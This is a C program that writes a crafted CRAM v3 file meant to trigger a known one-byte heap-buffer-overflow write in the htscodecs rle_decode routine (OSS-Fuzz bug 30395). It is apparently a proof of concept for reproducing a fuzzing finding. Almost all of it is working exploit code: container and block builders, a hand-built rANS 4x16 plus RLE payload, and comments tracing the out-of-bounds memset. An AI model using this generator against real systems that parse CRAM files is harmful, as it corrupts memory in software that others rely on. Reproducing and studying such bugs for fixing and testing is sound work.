/*
 * gen_poc.c: Generate a PoC for OSV-2021-305
 *
 * heap-buffer-overflow WRITE in rle_decode -> rans_uncompress_to_4x16
 * OSS-Fuzz bug ID: 30395
 *
 * The bug is an off-by-one in htscodecs/rle.c:rle_decode():
 *   if (outp + rlen > out_end)   // should be: outp + rlen >= out_end
 *       goto err;
 *   memset(outp, b, rlen+1);    // writes rlen+1 bytes (1 too many)
 *
 * Strategy: Build a minimal CRAM v3.0 file with a data container whose
 * compression header block uses rANS 4x16 + RLE encoding with a crafted
 * payload that triggers the off-by-one in rle_decode.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <zlib.h>  /* for crc32 */

static void put_le32(uint8_t *p, uint32_t v) {
    p[0] = v & 0xff;
    p[1] = (v >> 8) & 0xff;
    p[2] = (v >> 16) & 0xff;
    p[3] = (v >> 24) & 0xff;
}

/* ITF-8 encoding for CRAM */
static int itf8_put(uint8_t *buf, int32_t val) {
    if (val >= 0 && val < 0x80) {
        buf[0] = val;
        return 1;
    } else if (val >= 0x80 && val < 0x4000) {
        buf[0] = 0x80 | (val >> 8);
        buf[1] = val & 0xff;
        return 2;
    } else if (val >= 0x4000 && val < 0x200000) {
        buf[0] = 0xc0 | (val >> 16);
        buf[1] = (val >> 8) & 0xff;
        buf[2] = val & 0xff;
        return 3;
    } else if (val >= 0x200000 && val < 0x10000000) {
        buf[0] = 0xe0 | (val >> 24);
        buf[1] = (val >> 16) & 0xff;
        buf[2] = (val >> 8) & 0xff;
        buf[3] = val & 0xff;
        return 4;
    } else {
        buf[0] = 0xf0 | ((val >> 28) & 0x0f);
        buf[1] = (val >> 20) & 0xff;
        buf[2] = (val >> 12) & 0xff;
        buf[3] = (val >> 4) & 0xff;
        buf[4] = val & 0x0f;
        return 5;
    }
}

/*
 * Build a CRAM block.
 * Returns the number of bytes written to out.
 */
static int build_block(uint8_t *out, int method, int content_type,
                       int content_id, const uint8_t *data, int data_len,
                       int raw_size) {
    int pos = 0;
    uint8_t hdr[32];
    int hdr_len = 0;

    hdr[hdr_len++] = method;
    hdr[hdr_len++] = content_type;
    hdr_len += itf8_put(hdr + hdr_len, content_id);
    hdr_len += itf8_put(hdr + hdr_len, data_len);
    hdr_len += itf8_put(hdr + hdr_len, raw_size);

    memcpy(out + pos, hdr, hdr_len);
    pos += hdr_len;
    memcpy(out + pos, data, data_len);
    pos += data_len;

    /* CRC32 of the entire block (header + data) */
    uint32_t crc = crc32(0, out, pos);
    put_le32(out + pos, crc);
    pos += 4;

    return pos;
}

/*
 * Build a CRAM container header.
 * Writes to out and returns the number of bytes.
 * The header CRC32 covers everything from length to end of landmarks.
 */
static int build_container_header(uint8_t *out, int content_len,
                                  int ref_id, int ref_start, int align_span,
                                  int num_records, int64_t record_counter,
                                  int num_bases, int num_blocks,
                                  int num_landmarks, int *landmarks) {
    int pos = 0;

    /* length field (int32) */
    put_le32(out + pos, content_len);
    pos += 4;

    /* The CRC covers from this point onward */
    int crc_start = pos;

    pos += itf8_put(out + pos, ref_id);
    pos += itf8_put(out + pos, ref_start);
    pos += itf8_put(out + pos, align_span);
    pos += itf8_put(out + pos, num_records);
    /* record_counter (v3+): use itf8 for small values */
    pos += itf8_put(out + pos, (int32_t)record_counter);
    pos += itf8_put(out + pos, num_bases);
    pos += itf8_put(out + pos, num_blocks);
    pos += itf8_put(out + pos, num_landmarks);
    for (int i = 0; i < num_landmarks; i++) {
        pos += itf8_put(out + pos, landmarks[i]);
    }

    /*
     * CRC32 covers: everything from after the length field through landmarks.
     * Actually in CRAM v3, the CRC covers the entire container header
     * including the length field.
     */
    uint32_t crc = crc32(0, out, pos);
    put_le32(out + pos, crc);
    pos += 4;

    return pos;
}

int main(int argc, char **argv) {
    const char *outfile = "poc.bin";
    if (argc > 1)
        outfile = argv[1];

    uint8_t buf[8192];
    int pos = 0;

    /* === CRAM file definition (26 bytes) === */
    memcpy(buf + pos, "CRAM", 4); pos += 4;
    buf[pos++] = 3;  /* major version */
    buf[pos++] = 0;  /* minor version */
    memset(buf + pos, 0, 20); pos += 20;

    /* === SAM Header Container === */
    const char *sam_hdr = "@HD\tVN:1.6\tSO:unsorted\n@SQ\tSN:ref\tLN:100\n";
    int sam_hdr_len = strlen(sam_hdr);

    /* Header block data: LE int32(hdr_len) + header text
     * Note: cram_read_SAM_hdr uses int32_get_blk for the header length,
     * which expects a 4-byte little-endian int32, NOT ITF-8. */
    uint8_t hdr_block_data[512];
    int hbd_len = 0;
    put_le32(hdr_block_data + hbd_len, sam_hdr_len);
    hbd_len += 4;
    memcpy(hdr_block_data + hbd_len, sam_hdr, sam_hdr_len);
    hbd_len += sam_hdr_len;

    /* Build the header block (method=0/RAW, content_type=0/FILE_HEADER) */
    uint8_t hdr_block[1024];
    int hdr_block_len = build_block(hdr_block, 0, 0, 0,
                                    hdr_block_data, hbd_len, hbd_len);

    /* Build header container header */
    uint8_t hdr_container[256];
    int hdr_container_len = build_container_header(
        hdr_container, hdr_block_len,
        0, 0, 0,   /* ref_id, start, span */
        0, 0, 0,   /* num_records, counter, bases */
        1, 0, NULL  /* 1 block, 0 landmarks */
    );

    memcpy(buf + pos, hdr_container, hdr_container_len);
    pos += hdr_container_len;
    memcpy(buf + pos, hdr_block, hdr_block_len);
    pos += hdr_block_len;

    /* === Data Container with crafted rANS 4x16 + RLE block === */

    /*
     * Build the rANS 4x16 + RLE payload that triggers the off-by-one.
     *
     * rans_uncompress_to_4x16 format:
     *   byte[0]: flags byte
     *     0x40 = X_RLE: enable RLE
     *     0x20 = X_CAT: use raw copy instead of rANS for inner data
     *     Combined: 0x60 = X_RLE | X_CAT
     *   varint: osz (output size = uncompressed final size)
     *
     * With X_RLE, the metadata section:
     *   varint: u_meta_size_encoded
     *     If odd: raw inline metadata, actual size = value / 2
     *     If even: compressed metadata
     *   varint: rle_len (literal stream length, before RLE expansion)
     *   Then inline meta data (if raw)
     *
     * Meta data layout:
     *   byte[0]: nsyms (0 means 256)
     *   byte[1..nsyms]: the RLE symbols
     *   remaining: run-length stream (varint-encoded run lengths)
     *
     * With X_CAT, the literal data section:
     *   raw bytes (size = rle_len), directly memcpy'd
     *
     * Then rle_decode(literals, rle_len, run_stream, run_len,
     *                 rle_syms, nsyms, output, &osz) is called.
     *
     * To trigger: osz=2, lits=['A','A'], nsyms=1, syms=['A'],
     * runs=[0, 1]
     *
     * rle_decode execution:
     *   out_end = out + 2
     *   Iter 1: b='A', saved['A']=1, rlen=0 -> outp++ -> outp=out+1
     *   Iter 2: outp(out+1) < out_end(out+2) OK
     *     b='A', rlen=1
     *     Check: outp+rlen > out_end -> (out+1)+1 > out+2 -> 2>2 -> false
     *     memset(out+1, 'A', 2) -> writes out+1 and out+2 (OOB!)
     */
    uint8_t rans_data[64];
    int rpos = 0;

    rans_data[rpos++] = 0x60;  /* X_RLE | X_CAT */
    rans_data[rpos++] = 0x02;  /* osz = 2 */

    /* RLE meta: 4 bytes = [nsyms=1, sym='A', run0=0, run1=1] */
    /* u_meta_size = 4, encoded as 4*2+1 = 9 (odd = raw inline) */
    rans_data[rpos++] = 0x09;  /* u_meta_size encoded */
    rans_data[rpos++] = 0x02;  /* rle_len = 2 */

    /* Raw meta data */
    rans_data[rpos++] = 0x01;  /* nsyms = 1 */
    rans_data[rpos++] = 0x41;  /* sym[0] = 'A' */
    rans_data[rpos++] = 0x00;  /* run[0] = 0 */
    rans_data[rpos++] = 0x01;  /* run[1] = 1 */

    /* CAT literal data (raw) */
    rans_data[rpos++] = 0x41;  /* lit[0] = 'A' */
    rans_data[rpos++] = 0x41;  /* lit[1] = 'A' */

    int rans_data_len = rpos;

    /*
     * Wrap in a CRAM block: method=5 (RANS_PR0/RANSPR), content_type=1 (COMP_HEADER)
     * enum: RANSPR = 5 = RANS_PR0, which dispatches to rans_uncompress_4x16.
     * The raw_size is the expected decompressed size = osz = 2
     */
    uint8_t data_block[256];
    int data_block_len = build_block(data_block, 5, 1, 0,
                                     rans_data, rans_data_len, 2);

    /* Data container header */
    uint8_t data_container[256];
    int data_container_len = build_container_header(
        data_container, data_block_len,
        0, 1, 1,   /* ref_id=0, start=1, span=1 */
        1, 0, 1,   /* num_records=1, counter=0, bases=1 */
        1, 0, NULL  /* 1 block, 0 landmarks */
    );

    memcpy(buf + pos, data_container, data_container_len);
    pos += data_container_len;
    memcpy(buf + pos, data_block, data_block_len);
    pos += data_block_len;

    /* === EOF Container === */
    /* Build the standard CRAM v3 EOF container */
    uint8_t eof_block[32];
    int eof_block_len = build_block(eof_block, 0, 0, 0,
                                    (const uint8_t *)"", 0, 0);

    uint8_t eof_container[64];
    int eof_container_len = build_container_header(
        eof_container, eof_block_len,
        -1, -1, 0,  /* ref_id=-1, start=-1, span=0 */
        0, 0, 0,    /* records=0, counter=0, bases=0 */
        1, 0, NULL   /* 1 block, 0 landmarks */
    );

    memcpy(buf + pos, eof_container, eof_container_len);
    pos += eof_container_len;
    memcpy(buf + pos, eof_block, eof_block_len);
    pos += eof_block_len;

    /* Write output */
    FILE *f = fopen(outfile, "wb");
    if (!f) {
        perror("fopen");
        return 1;
    }
    fwrite(buf, 1, pos, f);
    fclose(f);

    printf("Wrote %d bytes to %s\n", pos, outfile);
    printf("\nCRAM v3 file with rANS 4x16 + RLE block (method=5/RANS_PR0, flags=0x60).\n");
    printf("The RLE payload triggers the off-by-one in rle_decode:\n");
    printf("  outp + rlen == out_end, but memset writes rlen+1 bytes.\n");

    return 0;
}
